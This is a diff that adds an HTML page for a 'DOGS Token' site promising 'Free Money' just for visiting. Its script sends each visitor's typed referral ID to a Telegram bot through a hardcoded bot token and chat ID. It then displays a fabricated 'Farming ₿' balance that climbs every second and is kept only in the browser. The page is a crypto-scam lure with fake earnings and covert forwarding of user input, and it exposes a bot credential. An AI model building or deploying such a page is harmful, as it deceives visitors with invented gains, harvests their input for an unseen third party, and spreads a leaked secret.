@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap">
+    <title>Earn Free Money</title>
+</head>
+<body background="fancy-pants.jpg">
+    <header>
+        <h1 id="logo" style="color: aliceblue;"><span style="color: orange;">DOGS</span> Token</h1>
+        <div id="navlink" >
+            <a href="#" style="color: aliceblue;">
+                <p>Home</p>
+            </a><a href="#" style="color: aliceblue;">
+                <p>Blog</p>
+            </a><a href="#" style="color: aliceblue;">
+                <p>Refer</p>
+            </a>
+        </div>
+    </header>
+    <div id="earn">
+        <h1 id="mtitle" style="color: aliceblue;">💸Earn <span>Free Money</span> by Just visiting our website💸</h1>
+        <form id="telegramForm">
+            <label for="refId"></label>
+            <input type="text" id="refId" name="refId" placeholder="Your Refer ID" required>
+            <button type="submit">Submit</button>
+        </form>
+
+        <div id="farmingMessage" style="display: none;">
+            <p>⚡Farming ₿<span id="amount">0</span></p>
+        </div>
+
+        <p id="response" style="color: aliceblue;"></p>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+    const form = document.getElementById('telegramForm');
+    const farmingMessage = document.getElementById('farmingMessage');
+    const amountDisplay = document.getElementById('amount');
+    const response = document.getElementById('response');
+
+    const botToken = '8121040404:AAGmTwLbEiiDBfcB05uwiiHSpVs8YURynwU'; // Replace with your bot token
+    const chatId = '7813759354'; // Replace with your chat ID
+
+    // Check localStorage if form was already submitted
+    let amount = localStorage.getItem('farmingAmount') ? parseFloat(localStorage.getItem('farmingAmount')) : 0;
+    let farmingStarted = localStorage.getItem('farmingStarted');
+
+    if (farmingStarted) {
+        // Hide form and show farming message
+        form.style.display = 'none';
+        farmingMessage.style.display = 'block';
+        startFarming();
+    }
+
+    // Handle form submission
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const referId = document.getElementById('refId').value;
+        const message = `New Refer ID: ${referId}`;
+
+        // Send message to Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                response.innerHTML = "Message sent successfully!";
+                // Hide form and start farming
+                form.style.display = 'none';
+                farmingMessage.style.display = 'block';
+                localStorage.setItem('farmingStarted', 'true');
+                startFarming();
+            } else {
+                response.innerHTML = "Failed to send message.";
+            }
+        })
+        .catch(error => {
+            response.innerHTML = "Error occurred!";
+            console.error('Error:', error);
+        });
+    });
+
+    function startFarming() {
+        amountDisplay.innerHTML = amount.toFixed(2); // Display the initial amount
+
+        setInterval(() => {
+            amount += 0.01; // Increase amount by 0.01 every second
+            amountDisplay.innerHTML = amount.toFixed(2); // Update the amount display
+            localStorage.setItem('farmingAmount', amount.toFixed(2)); // Store updated amount in localStorage
+        }, 1000); // Run every second
+    }
+});
+
+        </script>
+
+        <!-- <script>
+            document.getElementById('telegramForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the form from submitting the default way
+
+    // Get the Refer ID from the input
+    let referId = document.getElementById('refId').value;
+
+    // Replace with your own bot token
+    const botToken = '8121040404:AAGmTwLbEiiDBfcB05uwiiHSpVs8YURynwU';
+
+    // Replace with your own chat ID
+    const chatId = '7813759354';
+
+    // Format the message
+    const message = `New Refer ID: ${referId}`;
+
+    // Telegram API URL
+    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    // Send the message using fetch
+    fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            document.getElementById('response').innerHTML = "Message sent successfully!";
+        } else {
+            document.getElementById('response').innerHTML = "Failed to send message.";
+        }
+    })
+    .catch(error => {
+        document.getElementById('response').innerHTML = "Error occurred!";
+        console.error('Error:', error);
+    });
+});
+
+        </script> -->
+    </div>
+</body>
+</html>
